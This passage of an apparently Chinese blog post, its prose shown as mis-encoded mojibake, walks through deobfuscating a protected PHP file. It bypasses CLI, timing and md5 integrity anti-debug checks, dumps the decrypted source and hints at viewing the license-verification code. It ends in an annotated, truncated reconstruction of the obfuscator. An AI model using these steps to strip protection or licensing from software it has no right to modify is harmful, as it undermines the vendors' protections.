<code>VSCode</code>ï¼Œæ‰€ä»¥å®‰è£…äº† <code>PHP Debug</code> æ’ä»¶<br>ä»¥åŠéœ€è¦è¿›è¡Œä»£ç ç¼©è¿›æ ¼å¼åŒ–<br>ç„¶åæ‰¾åˆ°äº†è¿™ä¸ª<a href="https://github.com/nikic/PHP-Parser" target="_blank" rel="noopener">å·¥å…·PHP-Parser</a></p><p>ä½¿ç”¨å·¥å…·å‰è¦å…ˆå®‰è£… <code>composer</code><br><a href="https://getcomposer.org/download/" target="_blank" rel="noopener">composerä¸‹è½½åœ°å€</a><br><a href="https://developer.aliyun.com/composer" target="_blank" rel="noopener">é˜¿é‡Œäº‘é•œåƒ</a></p><p>å®‰è£…å¥½ <code>composer</code> åï¼Œè¿›å…¥ä¸‹å¥½çš„ <code>Parser</code> æ–‡ä»¶å¤¹ï¼Œç”¨å‘½ä»¤è¾“å…¥</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></div><p>è®©å…¶ç”Ÿæˆæ‰€éœ€è¦çš„åº“ï¼Œç„¶åå°†ä¸‹é¢çš„ä»£ç ä¿å­˜æˆä¸€ä¸ªæ–°çš„æ–‡ä»¶(ä¾‹å¦‚ <code>format.php</code>)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line">$code = file_get_contents(<span class="string">'index.php'</span>);</span><br><span class="line">$parser = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $ast = $parser-&gt;parse($code);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Error $error) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Parse error: &#123;$error-&gt;getMessage()&#125;\n"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$prettyPrinter = <span class="keyword">new</span> PrettyPrinter\Standard;</span><br><span class="line">$prettyCode = $prettyPrinter-&gt;prettyPrintFile($ast);</span><br><span class="line">file_put_contents(<span class="string">'index2.php'</span>, $prettyCode);</span><br></pre></td></tr></table></figure></div><p>ç„¶åæ‰§è¡Œå‘½ä»¤ <code>php format.php</code><br>ç„¶åå°†æ–°ç”Ÿæˆçš„æ–‡ä»¶ï¼Œä»¥ <code>Western (ISO 8859-1)</code> ç¼–ç å½¢å¼æ‰“å¼€ï¼Œè¿™æ ·å¯ä»¥æ˜¾ç¤ºæ›´å¤šéå¯æ˜¾ç¤ºå­—ç¬¦è€Œä¸æ˜¯å¤šå­—èŠ‚çš„å­—ç¬¦é›†</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode2.png" data-fancybox="group" data-caption="decode2" class="fancybox"><img alt="decode2" title="decode2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode2.png" class="lazyload"></a></p><hr><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>å¼€å¤´ä¸¤è¡Œéœ€è¦å…ˆæ³¨é‡Šæ‰ï¼Œé˜²æ­¢è°ƒè¯•è¿‡ç¨‹å‡ºç°ä¸€äº›é—®é¢˜</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div><p>ä½¿ç”¨ <code>VSCode</code> çš„è°ƒè¯•åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥æ–¹ä¾¿çš„æŸ¥çœ‹å˜é‡çš„å…·ä½“å†…å®¹ã€‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode3.png" data-fancybox="group" data-caption="decode3" class="fancybox"><img alt="decode3" title="decode3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode3.png" class="lazyload"></a></p><hr><h3 id="33è¡Œ"><a href="#33è¡Œ" class="headerlink" title="33è¡Œ"></a>33è¡Œ</h3><p>ç›´åˆ°è°ƒè¯•åˆ°è¿™ä¸€è¡Œï¼Œå‘ç°ç›´æ¥è·³å‡ºäº†ã€‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode4.png" data-fancybox="group" data-caption="decode4" class="fancybox"><img alt="decode4" title="decode4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode4.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_sapi_name() == <span class="string">'cli'</span> ? <span class="keyword">die</span>() : <span class="string">''</span>;</span><br></pre></td></tr></table></figure></div><p>å› ä¸ºæ˜¯ç”¨å‘½ä»¤è¡Œè¿è¡Œè°ƒè¯•ï¼Œæ‰€ä»¥æ‰§è¡Œå®Œè¿™ä¸€å¥ï¼Œç¨‹åºå°±ç»“æŸäº†ã€‚<br>ç„¶åå°†è¿™ä¸€è¡Œæ³¨é‡Šæ‰ï¼Œåœ¨ä»–ä¸‹é¢ä¸‹æ–­ç‚¹ã€‚é‡æ–°è¿è¡Œç¨‹åºã€‚</p><hr><p>34è¡Œæ˜¯å°±æ˜¯è¯»å–å½“å‰æ–‡ä»¶ï¼Œè¿™å¥è¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$f = file_get_contents(constant(<span class="string">'jnggfmpt'</span>));</span><br></pre></td></tr></table></figure></div><p>ç„¶åå°±åˆæ˜¯éªŒè¯è¿è¡Œç¯å¢ƒã€‚</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'SERVER_ADDR'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode5.png" data-fancybox="group" data-caption="decode5" class="fancybox"><img alt="decode5" title="decode5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode5.png" class="lazyload"></a></p><h3 id="ç„¶åçœ‹åé¢çš„-38-42è¡Œä»£ç "><a href="#ç„¶åçœ‹åé¢çš„-38-42è¡Œä»£ç " class="headerlink" title="ç„¶åçœ‹åé¢çš„ 38-42è¡Œä»£ç "></a>ç„¶åçœ‹åé¢çš„ 38-42è¡Œä»£ç </h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">argc = microtime(<span class="keyword">true</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span> (microtime(<span class="keyword">true</span>) * <span class="number">1000</span> - argc &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æŸ¥äº†ä¸‹ï¼Œæ˜¯ç”¨æ¥é˜²æ­¢ä¸‹æ–­ç‚¹è°ƒè¯•çš„ï¼Œå¦‚æœä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œè¿™é‡Œå°±è¶…è¿‡ 100 æ¯«ç§’ï¼Œç„¶åå°±é€€å‡ºäº†ã€‚<br>å› æ­¤å†³å®šç›´æ¥åœ¨è¿™æ¡è¯­å¥ä¹‹åä¸‹æ–­ç‚¹ï¼Œè®©ä»£ç ä¸€è¿ä¸²æ‰§è¡Œå®Œï¼Œè¿™æ ·å°±ä¸ä¼šè¶…è¿‡ 100 æ¯«ç§’äº†,ç›´æ¥æ³¨é‡Šæ‰ä¹Ÿè¡Œ<br>ç„¶åå†æ¥çœ‹ä¸€ä¸‹åé¢43è¡Œè¿™ä¸ª <code>eval</code><br>å›æ˜¾ç»“æœè·‘åˆ°äº†71è¡Œè¿™é‡Œ</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode6.png" data-fancybox="group" data-caption="decode6" class="fancybox"><img alt="decode6" title="decode6" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode6.png" class="lazyload"></a></p><p>çœ‹èµ·æ¥å¥½åƒæ²¡ä»€ä¹ˆå¸®åŠ©ï¼Œæ³¨é‡Šæ‰ä¹‹å</p><h3 id="çœ‹44è¡Œ"><a href="#çœ‹44è¡Œ" class="headerlink" title="çœ‹44è¡Œ"></a>çœ‹44è¡Œ</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!strpos(decode_func(substr($f, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($f, <span class="number">0</span>, <span class="number">-46</span>))) ? $undefined1() : $undefined2;</span><br></pre></td></tr></table></figure></div><p>ç”¨æ¥æ ¡éªŒæ•°æ®å®Œæ•´æ€§çš„ä»£ç ï¼Œè¿™é‡Œçš„ <code>$undefined1</code> å’Œ <code>$undefined2</code> éƒ½æ²¡æœ‰å®šä¹‰ã€‚å¦‚æœéªŒè¯å¤±è´¥ï¼Œå°±ä¼šè°ƒç”¨ <code>$undefined1</code> ä¼šç›´æ¥ <code>Error</code> é€€å‡ºç¨‹åºã€‚è€Œå¦‚æœéªŒè¯æˆåŠŸï¼Œè™½ç„¶ <code>$undefined2</code> å˜é‡ä¸å­˜åœ¨ï¼Œä½†æ˜¯åªæ˜¯ä¸€ä¸ª <code>Warning</code>ï¼Œæ²¡æœ‰å¤ªå¤§é—®é¢˜ã€‚</p><p>å…¶ä¸­çš„ <code>decode_func</code> å°±æ˜¯åŠ å¯†ä»£ç ä¸­æœ€åä¸€ä¸ªå‡½æ•°ï¼Œä¸“é—¨è´Ÿè´£å­—ç¬¦ä¸²è§£ç çš„ã€‚<br>éªŒè¯æ–¹æ³•å°±æ˜¯æŠŠæ–‡ä»¶å°¾éƒ¨åˆ†è§£å¯†å’Œå‰é¢çš„æ–‡ä»¶ä¸»ä½“éƒ¨åˆ†çš„ md5 å¯¹æ¯”ï¼Œè¿™æ¬¡æ‰§è¡Œè‚¯å®šåˆä¸èƒ½é€šè¿‡ã€‚<br>é€€å‡ºç¨‹åºï¼Œæ³¨é‡Šæ‰ï¼Œå†é‡æ–°è¿è¡Œã€‚</p><hr><h3 id="47è¡Œæ‰¾åˆ°å…³é”®æ€§ä»£ç "><a href="#47è¡Œæ‰¾åˆ°å…³é”®æ€§ä»£ç " class="headerlink" title="47è¡Œæ‰¾åˆ°å…³é”®æ€§ä»£ç "></a>47è¡Œæ‰¾åˆ°å…³é”®æ€§ä»£ç </h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$decrypted = str_rot13(@gzuncompress(decode_func(substr($f, <span class="number">-1522</span>, <span class="number">-46</span>))));</span><br></pre></td></tr></table></figure></div><p>åŒæ—¶å¯ä»¥çœ‹åˆ°å·²ç» <code>return</code> åŠ å¯†å‰çš„ä»£ç äº†ï¼Œä¸Šè¿°çš„ <code>-1522</code>å°±æ˜¯æœ€å…ˆæåˆ°çš„åŠ å¯†ä»£ç æœ«å°¾ <code>?&gt;</code> åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7.png" data-fancybox="group" data-caption="decode7" class="fancybox"><img alt="decode7" title="decode7" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7.png" class="lazyload"></a></p><h3 id="ç„¶åè·³åˆ°æœ€å"><a href="#ç„¶åè·³åˆ°æœ€å" class="headerlink" title="ç„¶åè·³åˆ°æœ€å"></a>ç„¶åè·³åˆ°æœ€å</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$f_varname = <span class="string">'_f_'</span>;</span><br><span class="line">$decrypted = check_and_decrypt($&#123;$f_varname&#125;);</span><br><span class="line">set_include_path(dirname($&#123;$f_varname&#125;));</span><br><span class="line">$base64_encoded_decrypted = base64_encode($decrypted);</span><br><span class="line">$eval_string = <span class="string">'eval(base64_decode($base64_encoded_decrypted));'</span>;</span><br><span class="line">$result = <span class="keyword">eval</span>($eval_string);</span><br><span class="line">set_include_path(dirname($&#123;$f_varname&#125;));</span><br><span class="line"><span class="keyword">return</span> $result;</span><br></pre></td></tr></table></figure></div><p>æ€ä¹ˆæ‰“å°å‡ºæ¥å‘¢<br>ç›´æ¥åœ¨ <code>$decrypted</code> åé¢åŠ ä¸Šä¸€è¡Œ <code>file_put_contents</code> å°±å¯ä»¥äº†ã€‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7_2.png" data-fancybox="group" data-caption="decode7_2" class="fancybox"><img alt="decode7_2" title="decode7_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode7_2.png" class="lazyload"></a></p><p>ç„¶åä¾¿å¯ä»¥çœ‹åˆ°è§£å¯†åçš„æºç </p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode8.png" data-fancybox="group" data-caption="decode8" class="fancybox"><img alt="decode8" title="decode8" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode8.png" class="lazyload"></a></p><p>å¦‚æœå°†ä¸Šè¿°çš„ 35è¡Œ <code>server_host</code> æ”¹æˆ <code>&#39;127.0.0.1&#39;</code> è¿˜å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è¿”å›çš„è¯·æ±‚éªŒè¯æ•°æ®ä»£ç </p><h3 id="50è¡Œ-decode-func"><a href="#50è¡Œ-decode-func" class="headerlink" title="50è¡Œ decode_func"></a>50è¡Œ decode_func</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode9.png" data-fancybox="group" data-caption="decode9" class="fancybox"><img alt="decode9" title="decode9" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode9.png" class="lazyload"></a></p><h2 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h2><p>æ„Ÿè°¢ <a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">Ganlv å¸ˆå‚…</a> çš„ä¸€è·¯æŒ‡å¯¼</p><h3 id="å¤§è‡´çš„åŠ å¯†æºç "><a href="#å¤§è‡´çš„åŠ å¯†æºç " class="headerlink" title="å¤§è‡´çš„åŠ å¯†æºç "></a>å¤§è‡´çš„åŠ å¯†æºç </h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…ˆæŠŠè¿™ä¸¤è¡Œå»æ‰ï¼Œé˜²æ­¢å‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œæˆ‘ä»¬è¿˜ä»€ä¹ˆéƒ½ä¸çŸ¥é“ã€‚</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="comment">// ini_set("display_errors", 0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'jnggfmpt'</span>)) &#123;</span><br><span class="line">    define(<span class="string">'jnggfmpt'</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (function_exists(<span class="string">'func2'</span>) == <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="comment">// ç¬¬ä¸€ä¸ªå‡½æ•°è¿”å› 'base64_decode' ï¼Œè¿™ä¸ªå‡½æ•°ä¸ä¾èµ–å…¶ä»–ä»»ä½•å‡½æ•°ï¼Œå•çº¯åœ°è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸² 'base64_decode'ã€‚</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $v1 = <span class="string">'6f6e66723634'</span>;</span><br><span class="line">            $v2 = <span class="string">'pa'</span>;</span><br><span class="line">            $v3 = <span class="string">'7374725f'</span>;</span><br><span class="line">            $v4 = <span class="string">'H'</span> . <span class="string">'*'</span>;</span><br><span class="line">            $v2 .= <span class="string">'ck'</span>; <span class="comment">// $v2 = 'pack';</span></span><br><span class="line">            $v1 .= <span class="string">'5f717270627172'</span>; <span class="comment">// $v1 = '6f6e667236345f717270627172';</span></span><br><span class="line">            $v3 .= <span class="string">'726f743133'</span>; <span class="comment">// $v3 = '7374725f726f743133';</span></span><br><span class="line">            <span class="comment">// $v5 = $v2($v4, $v3);</span></span><br><span class="line">            $v5 = pack(<span class="string">'H*'</span>, <span class="string">'7374725f726f743133'</span>);</span><br><span class="line">            <span class="comment">// $v5 = 'str_rot13';</span></span><br><span class="line">            <span class="comment">// $v6 = $v5($v2($v4, $v1));</span></span><br><span class="line">            $v6 = str_rot13(pack(<span class="string">'H*'</span>, <span class="string">'6f6e667236345f717270627172'</span>));</span><br><span class="line">            <span class="comment">// $v6 = 'base64_decode';</span></span><br><span class="line">            <span class="keyword">return</span> $v6;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬äºŒä¸ªå‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œè¦æ³¨æ„ç¬¬ä¸€ä¸ªå‚æ•°è¿˜æ˜¯ä¸€ä¸ªå¼•ç”¨å‚æ•°ã€‚</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func2</span><span class="params">(&amp;$arg1, $arg2)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// ç¬¬ä¸€å¥æ˜¯ä»¤ä¸€å †å˜é‡ç­‰äº func4</span></span><br><span class="line">            <span class="comment">// $v1 - $v5 éƒ½ä½¿ç”¨ func4 è§£ç ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç»“æœå¦‚ä¸‹</span></span><br><span class="line">            $v1 = <span class="string">'str_rot13'</span>;</span><br><span class="line">            $v2 = <span class="string">'strrev'</span>;</span><br><span class="line">            $v3 = <span class="string">'gzuncompress'</span>;</span><br><span class="line">            $v4 = <span class="string">'stripslashes'</span>;</span><br><span class="line">            $v5 = <span class="string">'explode'</span>;</span><br><span class="line">            <span class="comment">// $v6 = $v1($v2($v3($v4(func4('??????')))));</span></span><br><span class="line">            <span class="comment">// $v6 = str_rot13(strrev(gzuncompress(stripslashes(func4('??????')))));</span></span><br><span class="line">            $v6 = <span class="string">',chr,addslashes,rand,gzuncompress,assert_options,assert,file_get_contents,substr,unpack,constant,strpos,create_function,str_rot13,md5,set_include_path,dirname,preg_replace,base64_encode,base64_decode,'</span>;</span><br><span class="line">            <span class="comment">// $v7 = $v5($v6);</span></span><br><span class="line">            <span class="comment">// $v7 = explode($v6);</span></span><br><span class="line">            $v7 = <span class="keyword">array</span>(</span><br><span class="line">                <span class="number">0</span> =&gt; <span class="string">""</span>,</span><br><span class="line">                <span class="number">1</span> =&gt; <span class="string">"chr"</span>,</span><br><span class="line">                <span class="number">2</span> =&gt; <span class="string">"addslashes"</span>,</span><br><span class="line">                <span class="number">3</span> =&gt; <span class="string">"rand"</span>,</span><br><span class="line">                <span class="number">4</span> =&gt; <span class="string">"gzuncompress"</span>,</span><br><span class="line">                <span class="number">5</span> =&gt; <span class="string">"assert_options"</span>,</span><br><span class="line">                <span class="number">6</span> =&gt; <span class="string">"assert"</span>,</span><br><span class="line">                <span class="number">7</span> =&gt; <span class="string">"file_get_contents"</span>,</span><br><span class="line">                <span class="number">8</span> =&gt; <span class="string">"substr"</span>,</span><br><span class="line">                <span class="number">9</span> =&gt; <span class="string">"unpack"</span>,</span><br><span class="line">                <span class="number">10</span> =&gt; <span class="string">"constant"</span>,</span><br><span class="line">                <span class="number">11</span> =&gt; <span class="string">"strpos"</span>,</span><br><span class="line">                <span class="number">12</span> =&gt; <span class="string">"create_function"</span>,</span><br><span class="line">                <span class="number">13</span> =&gt; <span class="string">"str_rot13"</span>,</span><br><span class="line">                <span class="number">14</span> =&gt; <span class="string">"md5"</span>,</span><br><span class="line">                <span class="number">15</span> =&gt; <span class="string">"set_include_path"</span>,</span><br><span class="line">                <span class="number">16</span> =&gt; <span class="string">"dirname"</span>,</span><br><span class="line">                <span class="number">17</span> =&gt; <span class="string">"preg_replace"</span>,</span><br><span class="line">                <span class="number">18</span> =&gt; <span class="string">"base64_encode"</span>,</span><br><span class="line">                <span class="number">19</span> =&gt; <span class="string">"base64_decode"</span>,</span><br><span class="line">                <span class="number">20</span> =&gt; <span class="string">""</span>,</span><br><span class="line">            );</span><br><span class="line">            $arg1 = $v7[$arg2];</span><br><span class="line">            <span class="comment">// çœ‹åˆ°è¿™é‡ŒçŸ¥é“äº†ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥éœ€è¦ç”¨çš„æå–å‡½æ•°åçš„</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬ä¸‰ä¸ªå‡½æ•°è¢«ä¸»ç¨‹åºè°ƒç”¨äº†</span></span><br><span class="line">        <span class="comment">// ä¸è¿‡åˆ†æä¹‹åå‘ç°è¿™ä¸ª $arg1 å‚æ•°å¹¶æ²¡æœ‰ç”¨åˆ°</span></span><br><span class="line">        <span class="comment">// 